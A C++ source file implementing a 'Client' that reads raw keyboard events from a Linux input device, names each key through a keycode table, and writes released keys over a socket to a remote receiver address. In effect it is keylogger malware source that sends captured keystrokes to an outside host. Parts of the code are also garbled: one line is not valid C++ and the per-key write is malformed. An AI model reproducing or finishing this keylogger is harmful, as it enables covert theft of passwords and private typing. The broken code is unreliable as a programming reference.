#include "client.hpp"
#include <linux/input.h>

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"};

Client::Client(SharedClientSettings settings)
{
    clientAddress = settings.clientAddress;
    serverAddress = settings.recieverAddress;
    devicePath = getInputDevicePath();

    establishSocketConnection(sockfd, clientAddress);

    if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0)
        handleException("Connection failed:");

    isRunning = true;
};

void Client::run()
{
    int fd = open(devicePath.c_str(), O_RDONLY);

    struct input_event ev;

    while (isRunning)
    {
        read(fd, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0))
            keycodes[ev.code].size() if (write(sockfd, keycodes[ev.code], 1) == -1)
                handleException("Writing failed:");
    };
};

Client::~Client()
{
    isRunning = false;
    close(sockfd);
};
